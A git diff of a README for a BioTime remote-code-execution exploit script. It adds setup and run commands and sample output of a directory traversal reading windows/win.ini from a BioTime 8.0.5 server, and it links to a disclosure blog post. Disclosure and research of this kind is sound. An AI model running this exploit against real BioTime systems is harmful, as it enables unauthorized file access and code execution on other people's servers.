@@ -4,8 +4,17 @@ The exploit covers several vulnerabilities in BioTime which lead to Remote Code 
 For more details read the blog post at
 > https://krashconsulting.com/fury-of-fingers-biotime-rce/
 
+Usage
 ```
-└ $ python .\biotime_enum.py http://192.168.0.12:81
+python3 -m venv myenv
+source myenv/bin/activate
+pip3 install bs4 requests pycryptodome
+python3 biotime_enum.py
+```
+ 
+Sample Output
+```
+└ $ python3 biotime_enum.py http://192.168.0.12:81
 Found BioTime: 8.0.5 (Build:20211030.13012)
 Dir Traversal Attempt
 Output of windows/win.ini file:
